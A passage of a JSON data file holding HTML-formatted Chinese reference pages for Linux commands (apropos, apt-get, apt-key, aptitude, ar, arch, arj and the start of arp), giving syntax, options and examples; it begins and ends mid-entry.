class=\"hljs-keyword\">system</span>[,...], <span class=\"hljs-comment\">--systems=system[,...]：用于查找其它操作系统的手册页。</span>\n-M path, <span class=\"hljs-comment\">--manpath=path：指定从其它以冒号分隔的手册页层次查找。默认使用$MANPATH环境变量。这个选项覆盖$MANPATH的内容。</span>\n-L locale, <span class=\"hljs-comment\">--locale=locale：apropos调用C函数setlocale来得到当前本地化信息，包括$LC_MESSAGE和$LANG。使用该选项提供一个locale字符串来临时更改本地化信息。</span>\n-C <span class=\"hljs-built_in\">file</span>, <span class=\"hljs-comment\">--config-file=file：使用这个用户配置文件而不是默认的~/.manpath。</span>\n-h, <span class=\"hljs-comment\">--help：打印帮助信息并退出。</span>\n-V, <span class=\"hljs-comment\">--version：打印版本信息并退出。</span>\n</code></pre>\n<h3 id=\"返回值\">返回值</h3>\n<p>返回0表示成功，1表示用法、语法或配置文件错误，2表示操作错误，16表示没有找到匹配的内容。</p>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\">[root@localhost ~]# man -k who\nat.allow [at]        (<span class=\"hljs-number\">5</span>)  - determine who can submit jobs via at <span class=\"hljs-keyword\">or</span> batch\nat.deny [at]         (<span class=\"hljs-number\">5</span>)  - determine who can submit jobs via at <span class=\"hljs-keyword\">or</span> batch\njwhois               (<span class=\"hljs-number\">1</span>)  - client <span class=\"hljs-keyword\">for</span> the whois service\njwhois              (rpm) - Internet whois/nicname client.\nNet::LDAP::<span class=\"hljs-keyword\">Extension</span>::whoami (<span class=\"hljs-number\">3</span>pm)  - LDAP Who am I? Operation\nw                    (<span class=\"hljs-number\">1</span>)  - <span class=\"hljs-keyword\">Show</span> who <span class=\"hljs-keyword\">is</span> <span class=\"hljs-keyword\">logged</span> <span class=\"hljs-keyword\">on</span> <span class=\"hljs-keyword\">and</span> what they are doing\nwho                  (<span class=\"hljs-number\">1</span>p)  - display who <span class=\"hljs-keyword\">is</span> <span class=\"hljs-keyword\">on</span> the <span class=\"hljs-keyword\">system</span>\nwho                  (<span class=\"hljs-number\">1</span>)  - <span class=\"hljs-keyword\">show</span> who <span class=\"hljs-keyword\">is</span> <span class=\"hljs-keyword\">logged</span> <span class=\"hljs-keyword\">on</span>\nwhoami               (<span class=\"hljs-number\">1</span>)  - print effective userid\n\n[root@localhost ~]# apropos who\nat.allow [at]        (<span class=\"hljs-number\">5</span>)  - determine who can submit jobs via at <span class=\"hljs-keyword\">or</span> batch\nat.deny [at]         (<span class=\"hljs-number\">5</span>)  - determine who can submit jobs via at <span class=\"hljs-keyword\">or</span> batch\njwhois               (<span class=\"hljs-number\">1</span>)  - client <span class=\"hljs-keyword\">for</span> the whois service\njwhois              (rpm) - Internet whois/nicname client.\nNet::LDAP::<span class=\"hljs-keyword\">Extension</span>::WhoAmI (<span class=\"hljs-number\">3</span>pm)  - LDAP Who am I? Operation\nw                    (<span class=\"hljs-number\">1</span>)  - <span class=\"hljs-keyword\">Show</span> who <span class=\"hljs-keyword\">is</span> <span class=\"hljs-keyword\">logged</span> <span class=\"hljs-keyword\">on</span> <span class=\"hljs-keyword\">and</span> what they are doing\nwho                  (<span class=\"hljs-number\">1</span>p)  - display who <span class=\"hljs-keyword\">is</span> <span class=\"hljs-keyword\">on</span> the <span class=\"hljs-keyword\">system</span>\nwho                  (<span class=\"hljs-number\">1</span>)  - <span class=\"hljs-keyword\">show</span> who <span class=\"hljs-keyword\">is</span> <span class=\"hljs-keyword\">logged</span> <span class=\"hljs-keyword\">on</span>\nwhoami               (<span class=\"hljs-number\">1</span>)  - print effective userid\n</code></pre>\n<p>查找手册页名字和描述中包含emacs和vi的手册页：</p>\n<pre><code class=\"language-shell\">apropos -<span class=\"hljs-selector-tag\">a</span> emacs vi\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "apt-get",
        "des": "Debian Linux发行版中的APT软件包管理工具",
        "body": "<h1 id=\"apt-get\">apt-get</h1>\n<p>Debian Linux发行版中的APT软件包管理工具</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>apt-get命令</strong> 是Debian Linux发行版中的APT软件包管理工具。所有基于Debian的发行都使用这个包管理系统。deb包可以把一个应用的文件包在一起，大体就如同Windows上的安装文件。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\">apt-<span class=\"hljs-keyword\">get</span> [<span class=\"hljs-keyword\">OPTION</span>] PACKAGE\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\">apt-<span class=\"hljs-built_in\">get</span> install 安装新包\napt-<span class=\"hljs-built_in\">get</span> <span class=\"hljs-built_in\">remove</span> 卸载已安装的包（保留配置文件）\napt-<span class=\"hljs-built_in\">get</span> purge 卸载已安装的包（删除配置文件）\napt-<span class=\"hljs-built_in\">get</span> update 更新软件包列表\napt-<span class=\"hljs-built_in\">get</span><span class=\"hljs-built_in\"> upgrade </span>更新所有已安装的包\napt-<span class=\"hljs-built_in\">get</span> autoremove 卸载已不需要的包依赖\napt-<span class=\"hljs-built_in\">get</span> dist-upgrade 自动处理依赖包升级\napt-<span class=\"hljs-built_in\">get</span> autoclean 将已经删除了的软件包的.deb安装文件从硬盘中删除掉\napt-<span class=\"hljs-built_in\">get</span> clean 删除软件包的安装包\n\n-c：指定配置文件。\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<ul>\n<li>管理指令：对APT软件包的管理操作；</li>\n<li>软件包：指定要操纵的软件包。</li>\n</ul>\n<h3 id=\"实例\">实例</h3>\n<p>使用apt-get命令的第一步就是引入必需的软件库，Debian的软件库也就是所有Debian软件包的集合，它们存在互联网上的一些公共站点上。把它们的地址加入，apt-get就能搜索到我们想要的软件。/etc/apt/sources.list是存放这些地址列表的配置文件，其格式如下：</p>\n<pre><code class=\"language-shell\">deb web或<span class=\"hljs-selector-attr\">[ftp地址]</span> <span class=\"hljs-selector-attr\">[发行版名字]</span> <span class=\"hljs-selector-tag\">main</span>/contrib/non-<span class=\"hljs-selector-attr\">[free]</span>\n</code></pre>\n<p>我们常用的Ubuntu就是一个基于Debian的发行，我们使用apt-get命令获取这个列表，以下是我整理的常用命令：</p>\n<p>在修改<code>/etc/apt/sources.list</code>或者<code>/etc/apt/preferences</code>之后运行该命令。此外您需要定期运行这一命令以确保您的软件包列表是最新的：</p>\n<pre><code class=\"language-shell\">apt-<span class=\"hljs-keyword\">get</span> <span class=\"hljs-keyword\">update</span>\n</code></pre>\n<p>安装一个新软件包：</p>\n<pre><code class=\"language-shell\">apt-<span class=\"hljs-built_in\">get</span> install packagename\n</code></pre>\n<p>卸载一个已安装的软件包（保留配置文件）：</p>\n<pre><code class=\"language-shell\">apt-<span class=\"hljs-built_in\">get</span> <span class=\"hljs-built_in\">remove</span> packagename\n</code></pre>\n<p>卸载一个已安装的软件包（删除配置文件）：</p>\n<pre><code class=\"language-shell\">apt-<span class=\"hljs-built_in\">get</span> –purge <span class=\"hljs-built_in\">remove</span> packagename\n</code></pre>\n<p>会把已装或已卸的软件都备份在硬盘上，所以如果需要空间的话，可以让这个命令来删除你已经删掉的软件：</p>\n<pre><code class=\"language-shell\">apt-<span class=\"hljs-built_in\">get</span> autoclean apt\n</code></pre>\n<p>这个命令会把安装的软件的备份也删除，不过这样不会影响软件的使用的：</p>\n<pre><code class=\"language-shell\">apt-<span class=\"hljs-built_in\">get</span> clean\n</code></pre>\n<p>更新所有已安装的软件包：</p>\n<pre><code class=\"language-shell\">apt-<span class=\"hljs-built_in\">get</span> upgrade\n</code></pre>\n<p>将系统升级到新版本：</p>\n<pre><code class=\"language-shell\">apt-<span class=\"hljs-built_in\">get</span> <span class=\"hljs-built_in\">dist</span>-upgrade\n</code></pre>\n<p>定期运行这个命令来清除那些已经卸载的软件包的.deb文件。通过这种方式，您可以释放大量的磁盘空间。如果您的需求十分迫切，可以使用<code>apt-get clean</code>以释放更多空间。这个命令会将已安装软件包裹的.deb文件一并删除。大多数情况下您不会再用到这些.debs文件，因此如果您为磁盘空间不足 而感到焦头烂额，这个办法也许值得一试：</p>\n<pre><code class=\"language-shell\">apt-<span class=\"hljs-built_in\">get</span> autoclean\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "apt-key",
        "des": "管理Debian Linux系统中的软件包密钥",
        "body": "<h1 id=\"apt-key\">apt-key</h1>\n<p>管理Debian Linux系统中的软件包密钥</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>apt-key命令</strong> 用于管理Debian Linux系统中的软件包密钥。每个发布的deb包，都是通过密钥认证的，apt-key用来管理密钥。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">apt-key</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>操作指令：APT密钥操作指令。</p>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\">apt-key list          # 列出已保存在系统中key。\napt-key <span class=\"hljs-keyword\">add</span> keyname   # 把下载的key添加到本地<span class=\"hljs-keyword\">trusted</span>数据库中。\napt-key del keyname   # 从本地<span class=\"hljs-keyword\">trusted</span>数据库删除key。\napt-key <span class=\"hljs-keyword\">update</span>        # 更新本地<span class=\"hljs-keyword\">trusted</span>数据库，删除过期没用的key。\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "apt-sortpkgs",
        "des": "Debian Linux下对软件包索引文件进行排序的工具",
        "body": "<h1 id=\"apt-sortpkgs\">apt-sortpkgs</h1>\n<p>Debian Linux下对软件包索引文件进行排序的工具</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>apt-sortpkgs命令</strong> 是Debian Linux下对软件包索引文件进行排序的简单工具。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">apt-sortpkgs</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-s：使用源索引字段排序；</span>\n<span class=\"hljs-deletion\">-h：显示帮助信息。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>文件：指定要排序的包含debian包信息的索引文件。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "aptitude",
        "des": "Debian Linux系统中软件包管理工具",
        "body": "<h1 id=\"aptitude\">aptitude</h1>\n<p>Debian Linux系统中软件包管理工具</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>aptitude命令</strong> 与apt-get命令一样，都是Debian Linux及其衍生系统中功能极其强大的包管理工具。与apt-get不同的是，aptitude在处理依赖问题上更佳一些。举例来说，aptitude在删除一个包时，会同时删除本身所依赖的包。这样，系统中不会残留无用的包，整个系统更为干净。它通过文本操作菜单和命令两种方式管理软件包。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">aptitude</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-h：显示帮助信息；</span>\n<span class=\"hljs-deletion\">-d：仅下载软件包，不执行安装操作；</span>\n<span class=\"hljs-deletion\">-P：每一步操作都要求确认；</span>\n<span class=\"hljs-deletion\">-y：所有问题都回答“yes”；</span>\n<span class=\"hljs-deletion\">-v：显示附加信息；</span>\n<span class=\"hljs-deletion\">-u：启动时下载新的软件包列表。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>操作命令：用户管理软件包的操作命令。</p>\n<h3 id=\"实例\">实例</h3>\n<p>以下是我总结的一些常用aptitude命令，仅供参考：</p>\n<pre><code class=\"language-shell\">aptitude update            <span class=\"hljs-comment\"># 更新可用的包列表</span>\naptitude upgrade           <span class=\"hljs-comment\"># 升级可用的包</span>\naptitude dist-upgrade      <span class=\"hljs-comment\"># 将系统升级到新的发行版</span>\naptitude <span class=\"hljs-keyword\">install</span> pkgname   <span class=\"hljs-comment\"># 安装包</span>\naptitude <span class=\"hljs-keyword\">remove</span> pkgname    <span class=\"hljs-comment\"># 删除包</span>\naptitude purge pkgname     <span class=\"hljs-comment\"># 删除包及其配置文件</span>\naptitude search <span class=\"hljs-keyword\">string</span>     <span class=\"hljs-comment\"># 搜索包</span>\naptitude show pkgname      <span class=\"hljs-comment\"># 显示包的详细信息</span>\naptitude clean             <span class=\"hljs-comment\"># 删除下载的包文件</span>\naptitude autoclean         <span class=\"hljs-comment\"># 仅删除过期的包文件</span>\n</code></pre>\n<p>当然，你也可以在文本界面模式中使用 aptitude。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "ar",
        "des": "建立或修改备存文件，或是从备存文件中抽取文件",
        "body": "<h1 id=\"ar\">ar</h1>\n<p>建立或修改备存文件，或是从备存文件中抽取文件</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>ar命令</strong> 是一个建立或修改备存文件，或是从备存文件中抽取文件的工具，ar可让您集合许多文件，成为单一的备存文件。在备存文件中，所有成员文件皆保有原来的属性与权限</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\">ar [-]{dmpqrtx}[abcfilNoPsSuvV] [membername] [count] archive files...\n<span class=\"hljs-symbol\">Usage</span>: ar [emulation options] [-]{dmpqrstx}[abcDfilMNoPsSTuvV] [--plugin &lt;name&gt;] [member-name] [count] archive-file file...\n       ar -<span class=\"hljs-symbol\">M</span> [&lt;mri-脚本]\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\">ar 允许你 在第一个 命令行 参数中 以任意 顺序 混合 指定 操作码p 和修饰符mod .\n\n只要你 愿意, 也可以 用破折号 作为 命令行 第一个 参数的 开始.\n\np 关键字 指明 要执行的 操作, 只能 指明为 如下 之一:\n\nd      从档案中删除 模块. 通过files 指明 要删除的 模块的 名称; 如果 没有 指出 要删除的  文件  名称,  档案不会  改变  任何\n      内容.\n\n      如果 给出了'v' 修饰符,ar 会例出 它删除的 每一个 模块.\n\nm      用此 操作 在档案中移动 成员.\n      如果 某个 符号名 在档案的 多个 成员中 有定义, 那么 程序 怎样 连接 档案 文件 得到的 结果 可能是 不同的.\n      如果  没有为m 指定 修饰符, 由files 指出的 成员 将移动到 档案的末尾 ; 可以 通过 `a', `b' 或 `i' 等修饰符, 指定 成员\n      移动的 具体 位置.\n\np      在标准 输出上 打印 档案中 指定的 成员.  如果 给出了`v' 修饰符, 在 打印 成员 内容 之前, 先打印 成员的 名字.\n      如果没有 指明files 参数, 档案中 所有的 成员 都会被 打印 出来.\n\nq      快速 追加; 增加 files 到 archive 的末尾, 不进行 替换 检查.\n      修饰符 `a' `b' 和 `i'不 影响此 操作, 新成员 始终 追加到 档案的 末尾处.\n      修饰符 `v' 可以使 ar 列出 它追加的 所有文件.\n      由于 本功能 是用于 快速操作, 即使 档案中 有 符号表 索引 也不 进行 更新; 可以 使用 `ar s' 或 ranlib 明确 要求  更新\n      这些索引.\n\n      在为快速 追加 重建 索引时,由于 有 太多 不同的 系统, 所以 GNU ar 采用 `q' 作为 `r'的一个 同义字.\n\nr      把文件  files  插入 archive ( 替换 ). 本操作与 `q' 是不同的, 如果 档案中 已有的 某个 成员与 插入 文件的 名称 相同,\n      此成员 将被删除.\n      如果 不存在 名称为 files 的文件, ar 显示 一个 错误 消息, 并且 保留 档案中 已有的 同名 成员.\n      缺省情况下, 新成员 增加到 挡案的 末尾; 可以 通过 使用 `a' `b' 或 `i' 等修饰符 指定 相对于 已有 成员的 位置.\n      通过 使用 `v' 修饰符 会为每个 插入的 文件 产生 一行 输出, 根据 输出中的 字符 `a' 或 `r' 可以 表明 该文件  是追加的\n      (没有 删除 以前的成员) 还是 替换的.\n\nt      显示  一个 archive 档案 所包含 内容的 列表 , 或 档案中的 由 files 指出的 文件 列表.  通常 只显示 成员的 名称, 如果\n      使用 `v' 修饰符, 可以 得到 成员的 权限, 时间属性, 属主, 组和 大小.\n\n      如果 没有 指出 files, 档案中的 所有 文件 都会 列出.\n\n      如果 档案中 (称为 `b.a') 有多个 同名 成员 (称为 `fie'), `ar t b.a fie' 仅仅 列出 第一个; 要看到 它们的 全部,  必须\n      要求 完整的 列表 —在本例中是 `ar t b.a'.\n\nx      从档案中 抽取  成员 (名称为 files) .  如果 使用 `v' 修饰符, ar 会列出 它抽取的 每一个 文件的 名字.\n      如果没有给出 files, 抽取 档案中 所有的 文件.\n\n可以在 操作符 p 后紧随 一定数量的 修饰符 mod 以指明 操作的 各种 行为.\n\na      增加 文件到 档案中 已有 成员 之后  , 如果 使用了 修饰符 a, 必须在 档案 名称 archive 之前 以 membername 参数的 形式\n      给出 档案中 已有 成员的 名字.\n\nb      增加 文件到 档案中 已有 成员 之前  , 如果 使用了 修饰符 b, 必须在 档案 名称 archive 之前 以 membername 参数的 形式\n      给出 档案中 已有 成员的 名字.  (和修饰符 `i' 相同).\n\nc      建立    档案.  指定的 档案 archive 始终 会被建立, 如果 你要求 执行的是 更新, 通过 此修饰符 建立 档案时 会给出 一个\n      警告.\n      \nf      截短 档案成员的 名字.  ar 通常 允许 任意 长度的 文件名, 但这会 导致 与某些 系统上的 ar 出现 兼容性  问题,  使用  f\n      修饰符 可以 在往档案中 追加 文件时 把名字 截短.\n\ni      插入 文件到 档案中 已有 成员 之前  , 如果 使用了 修饰符 i, 必须在 档案 名称 archive 之前 以 membername 参数的 形式\n      给出 档案中 已有 成员的 名字.  (与修饰符 `b' 相同).\n\nl      接受此修饰符, 但不起作用.\n\nN      使用 count 参数. 本修饰符 用于 在档案中 有多个 同名 成员的 情况.  删除 或抽取 档案中 给定 名字的第 count 个实例.\n\no      抽取 成员时 保留 他们 原始的  时间属性. 如果 没有 此修饰符, 文件以抽取 的时间 作为 它的时间 属性.\n\nP      匹配 档案中的 名字时 使用 完整的 路径名.  ar 不能 建立 使用 完整 路径名的 档案  (这不符合  POSIX  标准),  但其它的\n      档案  工具  能够建立, 本选项 会使 ar 在抽取 由其它 工具 建立的 档案 文件时, 使用完整的 路径名 去匹配 档案中 成员的\n      名字.\n\ns      即使 没有对 档案 进行 改变, 用本 修饰符 也可以 往档案中 写一个 目标 文件的 索引 或更新 已经 存在的  索引.   可以与\n      其它 操作 一起 使用 本修饰符, 也可以 单独使用.  对一个 档案 执行 `ar s' 与执行 `ranlib' 等价.\n\nS      不生成  档案的 符号表. 这可以 加速 建立 大的档案 文件的 过程,但这样 建立的 档案 不能被 连接器 使用, 为建立 符号表,\n      在最后 执行 `ar' 时应该 不用 `S' 修饰符, 或者 对档案 执行 一次 `ranlib' .\n\nu      通常ar r... 把所有 列出的 文件 插入到 档案中, 如果 希望 仅仅 插入比 档案中 已有 成员 更新的  文件时,  就应该  使用\n      此修饰符.   `u'  修饰符  仅允许  与 `r' (替换) 操作 一起 使用.  某些 情况下, 由于 用 `q' 操作 比较 文件的 时间属性\n      会失去 速度上的 优势, 所以 不允许 执行 `qu' 组合操作.\n\nv      使用本修饰符可以进行 冗余的 操作。附加了此修饰符时，很多操作会显示 更多的消息，如处理的文件名等。\nV      显示 ar 的版本号。\n</code></pre>\n<p>选项参数 </p>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\">--plugin &lt;p&gt; - load the specified plugin</span>\n</code></pre>\n<p>ar：支持的目标： elf64-x86-64 elf32-i386 elf32-x86-64 a.out-i386-linux pei-i386 pei-x86-64 elf64-l1om elf64-k1om elf64-little elf64-big elf32-little elf32-big plugin srec symbolsrec verilog tekhex binary ihex</p>\n<h3 id=\"实例\">实例</h3>\n<p>打包文件</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-selector-attr\">[root@localhost ~]</span># <span class=\"hljs-selector-tag\">ls</span>   # 显示当前目录文件   \n<span class=\"hljs-selector-tag\">a</span><span class=\"hljs-selector-class\">.c</span>    <span class=\"hljs-selector-tag\">b</span><span class=\"hljs-selector-class\">.c</span> <span class=\"hljs-selector-tag\">d</span><span class=\"hljs-selector-class\">.c</span>   <span class=\"hljs-selector-tag\">install</span><span class=\"hljs-selector-class\">.log</span>      <span class=\"hljs-selector-tag\">qte</span>\n<span class=\"hljs-selector-tag\">anaconda-ks</span><span class=\"hljs-selector-class\">.cfg</span> <span class=\"hljs-selector-tag\">c</span><span class=\"hljs-selector-class\">.c</span> <span class=\"hljs-selector-tag\">Desktop</span> \n\n<span class=\"hljs-selector-attr\">[root@localhost ~]</span># <span class=\"hljs-selector-tag\">ar</span> <span class=\"hljs-selector-tag\">rv</span> <span class=\"hljs-selector-tag\">one</span><span class=\"hljs-selector-class\">.bak</span> <span class=\"hljs-selector-tag\">a</span><span class=\"hljs-selector-class\">.c</span> <span class=\"hljs-selector-tag\">b</span><span class=\"hljs-selector-class\">.c</span>  # 打包 <span class=\"hljs-selector-tag\">a</span><span class=\"hljs-selector-class\">.c</span> <span class=\"hljs-selector-tag\">b</span><span class=\"hljs-selector-class\">.c</span>文件 \n<span class=\"hljs-selector-tag\">ar</span>: 正在创建 <span class=\"hljs-selector-tag\">one</span><span class=\"hljs-selector-class\">.bak</span>\n<span class=\"hljs-selector-tag\">a</span> <span class=\"hljs-selector-tag\">-</span> <span class=\"hljs-selector-tag\">a</span><span class=\"hljs-selector-class\">.c</span>\n<span class=\"hljs-selector-tag\">a</span> <span class=\"hljs-selector-tag\">-</span> <span class=\"hljs-selector-tag\">b</span><span class=\"hljs-selector-class\">.c</span>\n</code></pre>\n<p>打包多个文件</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-selector-attr\">[root@localhost ~]</span># <span class=\"hljs-selector-tag\">ar</span> <span class=\"hljs-selector-tag\">rv</span> <span class=\"hljs-selector-tag\">two</span><span class=\"hljs-selector-class\">.bak</span> *<span class=\"hljs-selector-class\">.c</span>  <span class=\"hljs-comment\">// 打包以.c结尾的文件  </span>\n<span class=\"hljs-selector-tag\">ar</span>: 正在创建 <span class=\"hljs-selector-tag\">two</span><span class=\"hljs-selector-class\">.bak</span>\n<span class=\"hljs-selector-tag\">a</span> <span class=\"hljs-selector-tag\">-</span> <span class=\"hljs-selector-tag\">a</span><span class=\"hljs-selector-class\">.c</span>\n<span class=\"hljs-selector-tag\">a</span> <span class=\"hljs-selector-tag\">-</span> <span class=\"hljs-selector-tag\">b</span><span class=\"hljs-selector-class\">.c</span>\n<span class=\"hljs-selector-tag\">a</span> <span class=\"hljs-selector-tag\">-</span> <span class=\"hljs-selector-tag\">c</span><span class=\"hljs-selector-class\">.c</span>\n<span class=\"hljs-selector-tag\">a</span> <span class=\"hljs-selector-tag\">-</span> <span class=\"hljs-selector-tag\">d</span><span class=\"hljs-selector-class\">.c</span>\n</code></pre>\n<p>显示打包文件的内容</p>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-title\">@localhost</span> ~]# ar t two.bak    \na.<span class=\"hljs-keyword\">c</span>\nb.<span class=\"hljs-keyword\">c</span>\n<span class=\"hljs-keyword\">c</span>.<span class=\"hljs-keyword\">c</span>\nd.<span class=\"hljs-keyword\">c</span>\n</code></pre>\n<p>删除打包文件的成员文件</p>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-title\">@localhost</span> ~]# ar d two.bak a.<span class=\"hljs-keyword\">c</span> b.<span class=\"hljs-keyword\">c</span> <span class=\"hljs-keyword\">c</span>.<span class=\"hljs-keyword\">c</span>  \n[root<span class=\"hljs-title\">@localhost</span> ~]# ar t two.bak       \nd.<span class=\"hljs-keyword\">c</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "arch",
        "des": "显示当前主机的硬件架构类型",
        "body": "<h1 id=\"arch\">arch</h1>\n<p>显示当前主机的硬件架构类型</p>\n<h2 id=\"概要\">概要</h2>\n<pre><code class=\"language-shell\">arch [<span class=\"hljs-symbol\">OPTION</span>]...\n</code></pre>\n<h2 id=\"主要用途\">主要用途</h2>\n<ul>\n<li>打印机器架构信息；<code>arch</code> 命令输出结果有：i386、i486、i586、alpha、sparc、arm、m68k、mips、ppc、i686等。</li>\n</ul>\n<h2 id=\"选项\">选项</h2>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\">--help       显示帮助信息并退出。</span>\n<span class=\"hljs-comment\">--version    显示版本信息并退出。</span>\n</code></pre>\n<h2 id=\"例子\">例子</h2>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-symbol\">@localhost</span> ~]<span class=\"hljs-meta\"># arch</span>\nx86_64\n</code></pre>\n<h3 id=\"注意\">注意</h3>\n<ol>\n<li><p>该命令等价于 <code>uname -m</code>。</p>\n</li>\n<li><p>该命令是<code>GNU coreutils</code>包中的命令，相关的帮助信息请查看<code>man -s 1 arch</code>，<code>info coreutils 'arch invocation'</code>。</p>\n</li>\n</ol>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "arj",
        "des": "用于创建和管理.arj压缩包",
        "body": "<h1 id=\"arj\">arj</h1>\n<p>用于创建和管理.arj压缩包</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>arj命令</strong> 是 <code>.arj</code> 格式的压缩文件的管理器，用于创建和管理 <code>.arj</code> 压缩包。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">arj</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<ul>\n<li> 操作指令：对  <code>.arj</code> 压缩包执行的操作指令；</li>\n<li> 压缩包名称：指定要操作的arj压缩包名称。</li>\n</ul>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "arp",
        "des": "arp 命令用于显示和修改 IP 到 MAC 转换表",
        "body": "<h1 id=\"arp\">arp</h1>\n<p>arp 命令用于显示和修改 IP 到 MAC 转换表</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>arp 命令</strong> 是 Address Resolution Protocol，地址解析协议，是通过解析网络层地址来找寻数据链路层地址的一个网络协议包中极其重要的网络传输协议。而该命令可以显示和修改 arp 协议解析表中的缓冲数据。</p>\n<p>这个核心协议模块实现RFC826中定义的 Address Resolution Protocol [译注：即TCP/IP的第三层到第一层的地址转换协议]，用于在直接相连的网络中换第二层硬件地址和 Ipv4 协议地址之间的转换。 用户除非想对其进行配置，否则一般不会直接操作这个模块。</p>\n<p>实际上，它提供对核心中其它协议的服务。</p>\n<p>用户进程可以使用 packet(7) 的 sockets，收到 ARP 包（译注：一译分组）。 还有一种机制是使用 netlink(7) sockets，在用户空间管理 ARP 缓存的机制。我们也可以通过 ioctl (2) 控制任意 PF_INET socket上的 ARP 表</p>\n<p>ARP 模块维护一个硬件地址到协议地址映射的缓存。这个缓存有大小限制，所以不常用的和旧的记录（Entry）将被垃圾收集器清除（garbage-collected），垃圾收集器永远不能删除标为永久的记录。我们可以使用ioctls直接操纵缓冲， 并且其性状可以用下面定义的 sysctl 调节。</p>\n<p>如果在限定的时间（见下面的sysctl）内，一条现存映射没有肯定反馈时， 则认为相邻层的缓存记录失效。 为了再次向目标发送数据，ARP将首先试着询问本地arp进程 app_solicit 次，获取更新了的 MAC（介质访问控制）地址。 如果失败，并且旧的MAC地址是已知的，则发送 ucast_solicit 次的 unicast probe。如果仍然失败，则将向网络广播一个新的ARP请求,此时要 有待发送数据的队列</p>\n<p>如果 Linux 接到一个地址请求，而且该地址指向 Linux 转发的地址，并且接收接口打开了代理 arp 时，Linux 将自动添加一条非永久的代理 arp 记录；如果存在拒绝到目标的路由，则不添加代理 arp 记录。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\">arp（选项）（参数）\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-literal\">-</span>a <span class=\"hljs-comment\"># 主机 ：显示 arp 缓冲区的所有条目；</span>\n<span class=\"hljs-literal\">-</span>H <span class=\"hljs-comment\"># 地址类型 ：指定 arp 指令使用的地址类型；</span>\n<span class=\"hljs-literal\">-</span>d <span class=\"hljs-comment\"># 主机 ：从 arp 缓冲区中删除指定主机的 arp 条目；</span>\n<span class=\"hljs-literal\">-</span>D <span class=\"hljs-comment\"># 使用指定接口的硬件地址；</span>\n<span class=\"hljs-literal\">-</span>e <span class=\"hljs-comment\"># 以 Linux 的显示风格显示 arp 缓冲区中的条目；</span>\n<span class=\"hljs-literal\">-</span>i <span class=\"hljs-comment\"># 接口 ：指定要操作 arp 缓冲区的网络接口；</span>\n<span class=\"hljs-literal\">-</span>s <span class=\"hljs-comment\"># 主机 MAC 地址 ：设置指定的主机的 IP 地址与 MAC 地址的静态映射；</span>\n<span class=\"hljs-literal\">-</span>n <span class=\"hljs-comment\"># 以数字方式显示 arp 缓冲区中的条目；</span>\n<span class=\"hljs-literal\">-</span>v <span class=\"hljs-comment\"># 显示详细的 arp 缓冲区条目，包括缓冲区条目的统计信息；</span>\n<span class=\"hljs-literal\">-</span>f <span class=\"hljs-comment\"># 文件 ：设置主机的 IP 地址与 MAC 地址的静态映射。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>主机：查询 arp 缓冲区中指定主机的 arp 条目。</p>\n<h3 id=\"实例\">实例</h3>\n<p>显示arp 缓冲区内容</p>\n<pre><code class=\"language-shell\"><span 